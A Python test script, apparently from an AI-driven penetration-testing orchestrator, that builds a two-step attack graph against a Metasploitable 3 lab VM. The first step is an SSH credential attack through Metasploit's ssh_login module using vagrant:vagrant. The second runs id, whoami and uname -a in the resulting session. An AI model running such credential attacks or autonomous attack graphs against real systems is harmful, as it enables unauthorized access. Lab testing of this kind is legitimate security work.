"""
Baseline live test — the happy path.

Strips the orchestrator down to known-good steps:
  1. SSH bruteforce with vagrant:vagrant (we've seen this open sessions
     in every prior run on Metasploitable 3).
  2. Run three session commands that are guaranteed to produce non-
     failure output: id, whoami, uname -a.

No replanner. No judge. Just the executor walking a deterministic
2-node graph against a target we know responds.

Expected outcome:
  - ssh_bruteforce STATUS -> success
  - session_verify STATUS -> success
  - EXECUTION COMPLETE with success rate 100%
  - All commands produce real output (uid=..., vagrant, Linux ubuntu ...)
  - No "Command failed (...)" warnings
  - Wall time well under 1 minute (no full nmap, no LLM)

If THIS fails, the issue is the executor itself, not the replanner.
"""

from __future__ import annotations
import os

import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from core_agents.attack_graph import AttackGraph, AttackNode, Tactic
from core_agents.orchestrator import run_graph

TARGET_IP = "192.168.34.7"
ATTACKER_IP = os.getenv("LHOST", "192.168.34.1")


def build_graph() -> AttackGraph:
    g = AttackGraph.create(
        objective="Baseline happy-path: open SSH session and verify shell access.",
        target_ip=TARGET_IP,
        attacker_ip=ATTACKER_IP,
        name=f"baseline_{TARGET_IP}",
    )

    g.add_node(AttackNode(
        id="ssh_bruteforce",
        label="SSH Credential Guessing",
        tactic=Tactic.CREDENTIAL_ACCESS.value,
        agent_type="exploit",
        goal="Open an SSH session",
        objective=f"Brute-force SSH on {TARGET_IP} with vagrant:vagrant.",
        target_ip=TARGET_IP,
        tool_name="metasploit",
        module="auxiliary/scanner/ssh/ssh_login",
        module_options={
            "RHOSTS": TARGET_IP,
            "RPORT": 22,
            "USERNAME": "vagrant",
            "PASSWORD": "vagrant",
            "STOP_ON_SUCCESS": "true",
            "BRUTEFORCE_SPEED": "5",
        },
        max_retries=2,
    ))

    g.add_node(AttackNode(
        id="session_verify",
        label="Verify shell via id / whoami / uname",
        tactic=Tactic.DISCOVERY.value,
        agent_type="impact",
        goal="Confirm session is responsive",
        objective="Run three benign commands; each should produce real output.",
        target_ip=TARGET_IP,
        tool_name="session",
        commands_to_run=[
            "id",
            "whoami",
            "uname -a",
        ],
        max_retries=1,
    ))

    g.connect("ssh_bruteforce", "session_verify", condition="on_success",
              rationale="Session required for shell commands")
    return g


if __name__ == "__main__":
    graph = build_graph()
    print(f"Loaded graph: {graph.name}")
    print(f"Running BASELINE (explore=False, use_judge=False) against {TARGET_IP}...")
    run_graph(graph, explore=False, use_judge=False)
